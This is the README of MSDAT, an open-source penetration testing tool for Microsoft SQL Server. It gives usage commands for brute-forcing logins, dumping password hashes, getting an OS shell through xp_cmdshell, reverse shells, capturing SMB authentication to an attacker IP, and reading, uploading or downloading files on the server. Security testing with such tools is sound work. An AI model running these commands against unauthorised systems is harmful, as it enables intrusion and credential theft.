| __Quentin HARDY__    |
| ------------- |
| __quentin.hardy@protonmail.com__  |
| __quentin.hardy@bt.com__    |



MSDAT
====

MSDAT (**M**icro**s**oft SQL **D**atabase **A**ttacking **T**ool) is an open source penetration testing tool that tests the security of Microsoft SQL Databases remotely.

Usage examples of MSDAT:

* You have a Microsoft database listening remotely and you want to __find valid credentials__ in order to connect to the database
* You have a valid Microsoft SQL account on a database and you want to __escalate your privileges__
* You have a valid Microsoft SQL account and you want to __execute commands on the operating system__ hosting this DB (e.g. xp_cmdshell, OLE Automation, Agent Jobs)

Tested on Microsof SQL database 2005, 2008, 2012, 2014, 2016 and __2019__.

Changelog
====
* Version __2.4__ (2022/12/28) :
  * 2 new options in _search_ module:  _--privs_ and _--privs-full_ for getting current user roles and privileges (e.g. login and database privileges)
  * 1 new option in _search_ module: _--config_ for getting database configurations & information (version, databases, users, disable users, stored procecdures, etc)
* Version __2.3__ (2022/12/18) :
  * compataible with Microsoft SQL Server 2019
  * new option --schema-dump in search module for extract the schema and save in file (except for default DBs)
  * new option --table-dump in search module for extracting all tables and save in file (except for default DBs)
  * new option --sql-shell in search module for getting a minimal pseudo SQL shell
* Version __2.2__ (2022/04/29) :
  * _--nmap-file_ and _-l_ can be used in _all_ module and _passwordguesser_ module now. You can give a list of targets with _-l_ or a nmap file with _--nmap-file_.
  * Multiple bug fixes
* Version __2.1__ (2020/03/04) :
  * Option _--nmap-file_ for loading all mssql services from a XML nmap file (_python-libnmap_ has to be installed)
* Version __2.0__ (2020/03/04) :
  * Python 2 to __Python 3__: MSDAT is compatible with __Python 3 only__ now. __Python 2 is not supported__.
  * Separator option in password guesser module
  * Improvements in error catching in --put-file option of _xpcmdshell_ module
  * Improvements in reverse shell option of _jobs_ mobule
  * OLE automation module - command execution improvements
  * OLE automation module - Powershell reverse shell implemented
  * new option for printing list of agents jobs and their code: _--print-jobs_
* Version __1.2__ (2020/02/26) :
  * New method in xpCmdShell module: Upload a binary file with powershell (--put-file)
  * Improvement in oleAutomation: upload the file in binary mode instead of text file
* Version __1.1__ (2019/07/12) :
  * many other default credentials. Thanks to https://github.com/govolution/betterdefaultpasslist/
* Version __1.0__ (2017/02/15) :
  * first version realeased

  
Features
====

Thanks to MSDAT (**M**icro**s**oft SQL **D**atabase **A**ttacking **T**ool), you can (no exhaustive list):

* __get technical information__ (ex: database version) of a MSSQL database without to be authenticated
* load a nnmap file for scanning all MSSQL targets
* __search MSSQL accounts__ with a dictionnary attack
* __test each login as password__ (authentication required)
* __get a windows shell__ on the database server with
  * xp_cmdshell
  * OLE Automation
  * Jobs
* __download__ files remotely with:
  * OLE Automation
  * bulkinsert
  * openrowset
* __upload__ files on the server with:
  * OLE Automation
  * openrowset
* __capture a SMB authentication__ thanks to:
  * bulkinsert 
  * openrowset 
  * *xp_dirtree* 
  * *xp_fileexist* 
  * *xp-getfiledetails*
* __steal MSSQL hashed password__, on an any MSSQL version  
* __scan ports__ through the database:
  * openrowset
* __execute SQL requests on a remote MSSQL server__ trough the database (target) with:
  * *bulkinsert*
  * *openrowset*
* __list files/directories__ with:
  * *xp_subdirs*
  * *xp_dirtree*
* __list drives/medias__ with:
  * *xp_fixeddrives*
  * *xp_availablemedia*
* __create folder__ with:
  * *xp_create_subdir*
* search sensitive data in tables (e.g. credentials)
* get database configuration (databases, users, stored procedures, etc)
* extract schema and all tables information
* exeucte basic SQL commands in a pseudo SQL shell
 
Installation
====

Some dependancies must be installed in order to run MSDAT.

In ubuntu:
```bash
sudo apt-get install freetds-dev 
```
or download freetds on [http://www.freetds.org/](http://www.freetds.org/)

Install python dependencies:
```bash
sudo pip3 install -r requirements.txt
sudo activate-global-python-argcomplete
```
or
```bash
sudo pip3 install cython colorlog termcolor pymssql argparse python-libnmap
sudo pip3 install argcomplete && sudo activate-global-python-argcomplete
```
Add "use ntlmv2 = yes" in your freetds configuration file (ex: ```/etc/freetds/freetds.conf``` or ```/usr/local/etc/freetds.conf```).
Example:
```bash
[global]
        # TDS protocol version
        tds version = 8.0
        use ntlmv2 = yes
```
How to begin
====

```bash
python3 msdat.py -h                                                                                                                                                                                                                                                    2 ⨯
usage: msdat.py [-h] [--version]
                {all,mssqlinfo,passwordguesser,passwordstealer,xpcmdshell,jobs,smbauthcapture,oleautomation,bulkopen,xpdirectory,trustworthype,userlikepwd,search,cleaner}
                ...

               _   _  __  __   _  ___ 
              | \_/ |/ _||  \ / \|_ _|
              | \_/ |\_ \| o ) o || | 
              |_| |_||__/|__/|_n_||_| 
                        
------------------------------------------------------
 _   _  __            __           _           ___ 
| \_/ |/ _|         |  \         / \         |_ _|
| \_/ |\_ \         | o )         o |         | | 
|_| |_||__/icrosoft |__/atabase |_n_|ttacking |_|ool 
                        
-------------------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com)

positional arguments:
  {all,mssqlinfo,passwordguesser,passwordstealer,xpcmdshell,jobs,smbauthcapture,oleautomation,bulkopen,xpdirectory,trustworthype,userlikepwd,search,cleaner}
                        
                        Choose a main command
    all                 to run all modules in order to know what it is possible to do
    mssqlinfo           to get information without authentication
    passwordguesser     to know valid credentials
    passwordstealer     to get hashed passowrds
    xpcmdshell          to get a shell
    jobs                to execute system commands
    smbauthcapture      to capture a SMB authentication
    oleautomation       to read/write file and execute system commands
    bulkopen            to read a file and scan ports
    xpdirectory         to list files/drives and to create directories
    trustworthype       to become sysadmin with the trustwothy database method
    userlikepwd         to try each MSSQL username stored in the DB like the corresponding pwd
    search              to search in column names
    cleaner             clean local traces

optional arguments:
  -h, --help            show this help message and exit
  --version             show program's version number and exit
```

Examples
====

Modules
---

* You can list all modules:
```bash
./msdat.py -h
```

* When you have chosen a module (example: *all*), you can use it and you can list all features and options of the module:
```bash
./msdat.py all -h
```

You can know if a specific module can be used on a MSSQL server thanks to the *__--test-module__* option. This options is implemented in each mdat module. 

*all* module
---

The *all* module allows you to run all modules (depends on options that you have purchased).
```bash
python msdat.py all -s $SERVER
```

If you want:
* to use your own account file for the dictionnary attack
* try multiple passwords for a user without ask you
* to define your own timeout value
```bash
./msdat.py all -s $SERVER -p $PORT --accounts-file accounts.txt --login-timeout 10 --force-retry
```

In each module, you can define the charset to use with the *--charset* option.

*mssqlinfo* module
---

To get technical information about a remote MSSQL server without to be authenticated:
```bash
./msdat.py mssqlinfo -s $SERVER -p $PORT --get-max-info
```

This module uses *__TDS protocol__* and *__SQL browser Server__* to get information.

*passwordguesser* module
---

This module allows you to search valid credentials :
```bash
./msdat.py passwordguesser -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --force-retry --search
```

*--force-retry* option allows to test multiple passwords for each user without ask you

You can specify your own account file with the *--accounts-file* option:
```bash
./msdat.py passwordguesser -s $SERVER -p $PORT --search --accounts-file accounts.txt --force-retry
```

*passwordstealer* module
---

To dump hashed passwords :
```bash
./msdat.py passwordstealer -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --dump --save-to-file test.txt
```

This modules has been tested on SQL Server 2000, 2005, 2008 and 2014.

*xpcmdshell* module
---

To execute system commands thanks to *xp_cmdshell* ([https://msdn.microsoft.com/en-us/library/ms190693.aspx](https://msdn.microsoft.com/en-us/library/ms190693.aspx)):
```bash
./msdat.py xpcmdshell -s $SERVER -p $PORT -U $USER -P $PASSWORD --shell
```

This previous command give you an interactive shell on the remote database server.

If *xp_cmdshell* is not enabled, the *--enable-xpcmdshell* can be used in this module to activate it:
```bash
./msdat.py xpcmdshell -s $SERVER -p $PORT -U $USER -P $PASSWORD --enable-xpcmdshell --disable-xpcmdshell --disable-xpcmdshell --shell
```

The *--enable-xpcmdshell* option enables *xp_cmdshell* if it is not enabled (not enabled by default).

The *--disable-xpcmdshell* option disables *xp_cmdshell* if this one is enabled.

*smbauthcapture* module
---

Thanks to this module, you can capture a SMB authentication:
```bash
./msdat.py smbauthcapture -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --capture $MY_IP_ADDRESS --share-name SHARE
```

To capture the SMB authentication, the *auxiliary/server/capture/smb* ([http://www.rapid7.com/db/modules/auxiliary/server/capture/smb](http://www.rapid7.com/db/modules/auxiliary/server/capture/smb)) module of metasploit could be used:
```bash
msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > exploit
```

The *__capture__* command of this module tries to capture a SMB authentication thanks to *xp_dirtree*, *xp_fileexist* or *xp-getfiledetails* procedure.

If you want to choose the SMB authentication procedure to capture the authentication:
```bash
./msdat.py smbauthcapture -s $SERVER -p $PORT -U $USER -P $PASSWORD --xp-dirtree-capture 127.0.0.1
./msdat.py smbauthcapture -s $SERVER -p $PORT -U $USER -P $PASSWORD --xp-fileexist-capture 127.0.0.1
./msdat.py smbauthcapture -s $SERVER -p $PORT -U $USER -P $PASSWORD --xp-getfiledetails-capture 127.0.0.1
```

You can change the SHARE name with the *--share-name* option.

*oleautomation* module
---

This module can be used to read/write file in the database server.

The following command read the file *temp.txt* stored in the database server:
```bash
./msdat.py oleautomation -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --read-file 'C:\Users\Administrator\Desktop\temp.txt'
```

To write a string in a file (*temp.txt*) remotely:
```bash
./msdat.py oleautomation -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --write-file 'C:\Users\Administrator\Desktop\temp.txt' 'a\nb\nc\nd\ne\nf'
```

This module can be used to download a file (*C:\Users\Administrator\Desktop\temp.txt*) stored on the database server:
```bash
./msdat.py oleautomation -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --get-file 'C:\Users\Administrator\Desktop\temp.txt' temp.txt
```

Also, you can use this module to upload a file (*temp.txt*) on the target:
```bash
./msdat.py oleautomation -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --put-file temp.txt 'C:\Users\Administrator\Desktop\temp.txt
```

*bulkopen* module
---

The module *bulkopen* can be used :
* to read/download files stored on a database server 
* to scan ports through the database server
* to execute SQL requests on a remote MSSQL server through the database

To read a file stored in the target, the following command can be used:
```bash
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --read-file 'C:\Users\Administrator\Desktop\temp.txt'"
```

The *--method* option can be used to specify the method to use:
* *bulkinsert* ([https://msdn.microsoft.com/en-us/library/ms188365.aspx](https://msdn.microsoft.com/en-us/library/ms188365.aspx)) or 
* *openrowset*([https://msdn.microsoft.com/en-us/library/ms190312.aspx](https://msdn.microsoft.com/en-us/library/ms190312.aspx))):

```bash
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --read-file 'C:\Users\Administrator\Desktop\temp.txt' --method openrowset
```

To download a file (*C:\Users\Administrator\Desktop\temp.txt*):`
``bash
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --get-file 'C:\Users\Administrator\Desktop\temp.txt' temp.txt
```

This module can be used to scan ports (1433 and 1434 of 127.0.0.1) through the database server:
```bash
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --scan-ports 127.0.0.1 1433,1434 -v
```

You can scan a range of ports: 
```bash
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --scan-ports 127.0.0.1 1433-1438
```

This module can be used to execute SQL requests (ex: *select @@ServerName*) on a remote database server (ex: $SERVER2) through the database ($SERVER):
```bash
./msdat.py bulkopen -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --request-rdb $SERVER2 $PORT $DATABASE $USER $PASSWORD 'select @@ServerName'
```

*xpdirectory* module
---

The module *xpdirectory* can be used:
* to list: 
 * files
 * directories
 * drives
* to check if a file exists
* to create a directory

To list files in a specific directory:
```bash
./msdat.py xpdirectory -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --list-files 'C:\'
```

To list directories in a specific directory:
```bash
./msdat.py xpdirectory -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --list-dir 'C:\'
```

To list drives:
```bash
./msdat.py xpdirectory -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --list-fixed-drives --list-available-media
```

To check if a file exist:
```bash
./msdat.py xpdirectory -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --file-exists 'C:\' --file-exists 'file.txt'
```

To create a directory:
```bash
./msdat.py xpdirectory --s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --create-dir 'C:\temp'
```

*search* module
---

The module *search* can be used to search a pattern in column names of tables and views.
Usefull to search the pattern *%password%* in column names for example.


To get column names which contains password patterns (ex: passwd, password, motdepasse, clave):
```bash
./msdat.py search -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --pwd-column-names --show-empty-columns
```

If you want to see column names which doesn't contain a data, you should use the option *--show-empty-columns*.

To search a specific pattern in column names of views and tables:
```bash
./msdat.py search -s $SERVER -p $PORT -U $USER -P $PASSWORD -d $DATABASE --pwd-column-names --show-empty-columns
```

Donation
====
If you want to support my work doing a donation, I will appreciate a lot:

* Via BTC: 36FugL6SnFrFfbVXRPcJATK9GsXEY6mJbf









